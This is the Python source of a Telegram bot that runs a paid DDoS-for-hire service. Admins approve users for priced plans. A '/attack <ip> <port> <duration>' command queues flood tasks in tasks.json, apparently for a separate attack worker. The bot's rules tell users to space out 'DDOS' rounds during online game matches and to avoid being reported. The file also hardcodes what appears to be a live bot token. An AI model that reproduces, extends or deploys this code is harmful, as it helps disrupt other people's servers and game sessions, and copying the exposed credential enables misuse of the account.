import os
import telebot
import json
import logging
import time
from datetime import datetime, timedelta
import pytz
from threading import Thread
import asyncio
from telebot import types
import uuid  # Added for unique task IDs
import fcntl  # Added for file locking

loop = asyncio.get_event_loop()

TOKEN = '7343295464:AAEM7vk5K3cNXAywZC_Q11wmMzMu4gk09PU'
CHANNEL_ID = -1002056936761
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

DATA_FILE = 'Moin.js'  # offline JSON file storing user data

# Load users from local file
def load_users():
    if not os.path.isfile(DATA_FILE):
        return {}
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        logging.error(f"Failed to load data file: {e}")
        return {}

# Save users to local file
def save_users(users):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(users, f, indent=4)
    except Exception as e:
        logging.error(f"Failed to save data file: {e}")

users_data = load_users()

def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(
        text="♻️ 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 ♻️", url="https://t.me/+7Uwzn_Akrqg0MTFl")
    button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
                                        url="https://t.me/Navin_pre")
    markup.add(button3)
    markup.add(button1)
    return markup

def extend_and_clean_expired_users():
    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz)
    logging.info(f"Current Date and Time: {now}")
    to_delete = []
    for user_id_str, user in users_data.items():
        try:
            valid_until_str = user.get("valid_until", "")
            time_approved_str = user.get("time_approved", "")
            approving_admin_id = user.get("approved_by")
            username = user.get("username", "Unknown User")
            if valid_until_str:
                valid_until_date = datetime.strptime(valid_until_str, "%Y-%m-%d").date()
                time_approved = datetime.strptime(time_approved_str, "%I:%M:%S %p %Y-%m-%d").time() if time_approved_str else datetime.min.time()
                valid_until_datetime = datetime.combine(valid_until_date, time_approved)
                valid_until_datetime = tz.localize(valid_until_datetime)
                if now > valid_until_datetime:
                    user_id = int(user_id_str)
                    try:
                        bot.send_message(
                            user_id,
                            f"*⚠️ Access Expired! ⚠️*\n"
                            f"Your access expired on {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}.\n"
                            f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                            f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                            f"If you believe this is a mistake or wish to renew your access, please contact support. 💬",
                            reply_markup=create_inline_keyboard(), parse_mode='Markdown'
                        )
                        if approving_admin_id:
                            bot.send_message(
                                approving_admin_id,
                                f"*🔴 User {username} (ID: {user_id}) has been automatically removed due to expired access.*\n"
                                f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                                f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                                f"🚫 Status: Removed*",
                                reply_markup=create_inline_keyboard(), parse_mode='Markdown'
                            )
                    except Exception as e:
                        logging.error(f"Failed to send message for user {user_id}: {e}")
                    to_delete.append(user_id_str)
        except Exception as e:
            logging.error(f"Failed to parse or check expiration for user {user_id_str}: {e}")

    for user_id_str in to_delete:
        users_data.pop(user_id_str, None)
        logging.info(f"User {user_id_str} removed from offline storage.")
    if to_delete:
        save_users(users_data)
    logging.info("Approval times extension and cleanup completed. ✅")

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()
    if not is_admin:
        bot.send_message(
            chat_id,
            "🚫 *Access Denied!*\n"
            "❌ *You don't have the required permissions to use this command.*\n"
            "💬 *Please contact the bot owner if you believe this is a mistake.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return
    if len(cmd_parts) < 2:
        bot.send_message(
            chat_id,
            "⚠️ *Invalid Command Format!*\n"
            "ℹ️ *To approve a user:*\n"
            "`/approve <user_id> <plan> <days>`\n"
            "ℹ️ *To disapprove a user:*\n"
            "`/disapprove <user_id>`\n"
            "🔄 *Example:* `/approve 12345678 1 30`\n"
            "✅ *This command approves the user with ID 12345678 for Plan 1, valid for 30 days.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return
    action = cmd_parts[0]
    try:
        target_user_id = int(cmd_parts[1])
    except ValueError:
        bot.send_message(chat_id,
                         "⚠️ *Error: [user_id] must be an integer!*\n"
                         "🔢 *Please enter a valid user ID and try again.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return
    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    try:
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    except ValueError:
        bot.send_message(chat_id,
                         "⚠️ *Error: <plan> and <days> must be integers!*\n"
                         "🔢 *Ensure that the plan and days are numerical values and try again.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return
    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz).date()
    if action == '/approve':
        valid_until = (
            now +
            timedelta(days=days)).isoformat() if days > 0 else now.isoformat()
        time_approved = datetime.now(tz).strftime("%I:%M:%S %p %Y-%m-%d")
        users_data[str(target_user_id)] = {
            "user_id": target_user_id,
            "username": target_username,
            "plan": plan,
            "days": days,
            "valid_until": valid_until,
            "approved_by": user_id,
            "time_approved": time_approved,
            "access_count": 0
        }
        save_users(users_data)
        bot.send_message(
            chat_id,
            f"✅ *Approval Successful!*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"📋 *Plan:* `{plan}`\n"
            f"⏳ *Duration:* `{days} days`\n"
            f"🎉 *The user has been approved and their account is now active.*\n"
            f"🚀 *They will be able to use the bot's commands according to their plan.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        bot.send_message(
            target_user_id,
            f"🎉 *Congratulations, {target_user_id}!*\n"
            f"✅ *Your account has been approved!*\n"
            f"📋 *Plan:* `{plan}`\n"
            f"⏳ *Valid for:* `{days} days`\n"
            f"🔥 *You can now use the /attack command to unleash the full power of your plan.*\n"
            f"💡 *Thank you for choosing our service! If you have any questions, don't hesitate to ask.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        bot.send_message(
            CHANNEL_ID,
            f"🔔 *Notification:*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"💬 *Username:* `@{target_username}`\n"
            f"👮 *Has been approved by Admin:* `{user_id}`\n"
            f"🎯 *The user is now authorized to access the bot according to Plan {plan}.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    elif action == '/disapprove':
        removed = users_data.pop(str(target_user_id), None)
        save_users(users_data)
        bot.send_message(
            chat_id,
            f"❌ *Disapproval Successful!*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"🗑 *The user's account has been disapproved and all related data has been removed from the system.*\n"
            f"🚫 *They will no longer be able to access the bot.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        bot.send_message(
            target_user_id,
            "🚫 *Your account has been disapproved and removed from the system.*\n"
            "💬 *If you believe this is a mistake, please contact the admin.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        bot.send_message(
            CHANNEL_ID,
            f"🔕 *Notification:*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"👮 *Has been disapproved by Admin:* `{user_id}`\n"
            f"🗑 *The user has been removed from the system.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        user_data = users_data.get(str(user_id))
        if not user_data or user_data.get('plan', 0) == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       "*You must be approved to use this bot.*\n"
                                       "*Please contact the owner for assistance: @Navin_pre.*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                       "*Please use the following format:*\n"
                                       "`/attack <ip> <port> <duration>`",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*🔒 Port {target_port} is blocked.*\n"
                                       "*Please choose a different port to continue.*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
        if duration > 180:
            bot.send_message(chat_id, "*⏳ The maximum duration allowed is 180 seconds.*\n"
                                       "*Please reduce the duration and try again!*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()
        sent_message = bot.send_message(chat_id, f"*🚀 Attack Initiated! 🚀*\n\n"
                                                 f"*📡 Target Host: {target_ip}*\n"
                                                 f"*👉 Target Port: {target_port}*\n"
                                                 f"*⏰ Duration: {duration} seconds remaining*\n"
                                                 "*Prepare for action! 🔥*",
                                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        # Append task to tasks.json with file locking
        task = {
            'id': str(uuid.uuid4()),  # Unique task ID
            'ip': target_ip,
            'port': target_port,
            'time': duration
        }
        try:
            tasks = []
            with open('tasks.json', 'a+') as f:
                fcntl.flock(f.fileno(), fcntl.LOCK_EX)  # Acquire exclusive lock
                f.seek(0)
                if f.read(1):  # Check if file is not empty
                    f.seek(0)
                    tasks = json.load(f)
                tasks.append(task)
                f.seek(0)
                f.truncate()
                json.dump(tasks, f, indent=4)
                fcntl.flock(f.fileno(), fcntl.LOCK_UN)  # Release lock
            logging.info(f"Attack task saved successfully: {task}")
        except Exception as e:
            logging.error(f"Error saving attack task: {e}")

        last_message_text = ""
        for remaining_time in range(duration, 0, -1):
            time.sleep(1)
            elapsed_time = time.time() - bot.attack_start_time
            remaining_time = max(0, bot.attack_duration - int(elapsed_time))
            new_message_text = (f"*🚀 Attack Initiated! 🚀*\n\n"
                                f"*📡 Target Host: {target_ip}*\n"
                                f"*👉 Target Port: {target_port}*\n"
                                f"*⏰ Duration: {remaining_time} seconds remaining*\n"
                                "*Prepare for action! 🔥*")
            if new_message_text != last_message_text:
                try:
                    bot.edit_message_text(chat_id=chat_id, message_id=sent_message.message_id,
                                          text=new_message_text,
                                          reply_markup=create_inline_keyboard(), parse_mode='Markdown')
                    last_message_text = new_message_text
                except Exception as e:
                    if "message is not modified" in str(e):
                        logging.warning("Attempted to modify message with no changes. Skipping...")
                    else:
                        logging.error(f"Error editing message: {e}")

        bot.attack_in_progress = False

    except Exception as e:
        logging.error(f"Error in attack command: {e}")
        bot.send_message(chat_id, "*❗️ An error occurred while processing your request.*", parse_mode='Markdown')

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = bot.attack_duration - elapsed_time
        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
                                       "*🔍 Hold tight, the action is still unfolding!*\n"
                                       "*💪 Stay tuned for updates!*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                   "*🔄 Feel free to initiate your attack whenever you're ready!*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_data.get(str(user_id))
        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz)
        current_date = now.date().strftime("%Y-%m-%d")
        current_time = now.strftime("%I:%M:%S %p")
        if not user_data:
            response = (
                "*⚠️ No account information found. ⚠️*\n"
                "*It looks like you don't have an account with us.*\n"
                "*Please contact the owner for assistance.*\n"
            )
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
                                                 url="https://t.me/Navin_pre")
            button2 = types.InlineKeyboardButton(
                text="💸 �_P𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/+7Uwzn_Akrqg0MTFl")
            markup.add(button1)
            markup.add(button2)
        else:
            username = message.from_user.username or "Unknown User"
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            response = (
                f"*👤 Username: @{username}*\n"
                f"*💼 Plan: {plan} ₹*\n"
                f"*📅 Valid Until: {valid_until}*\n"
                f"*📆 Current Date: {current_date}*\n"
                f"*🕒 Current Time: {current_time}*\n"
                "*🎉 Thank you for being with us! 🎉*\n"
                "*If you need any help or have questions, feel free to ask.* 💬"
            )
            markup = types.InlineKeyboardMarkup()
            button = types.InlineKeyboardButton(
                text="💢 𝐉𝐎𝐈𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 💢", url="https://t.me/+7Uwzn_Akrqg0MTFl")
            markup.add(button)
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /myinfo command: {e}")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔️ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡 \nMessage TO Owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!*"
    )
    try:
        bot.send_message(message.chat.id, rules_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error while processing /rules command: {e}")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
                 "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
                 "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
                 "4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
                 "5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
                 "6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")
    try:
        bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error while processing /help command: {e}")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
        "📩 **Telegram:** @Navin_pre\n\n"
        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
    )
    bot.send_message(message.chat.id, response, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                           "*🚀 Get ready to dive into the action!*\n\n"
                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error while processing /start command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":
    extend_and_clean_expired_users()
    logging.info("Starting Telegram bot...")
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
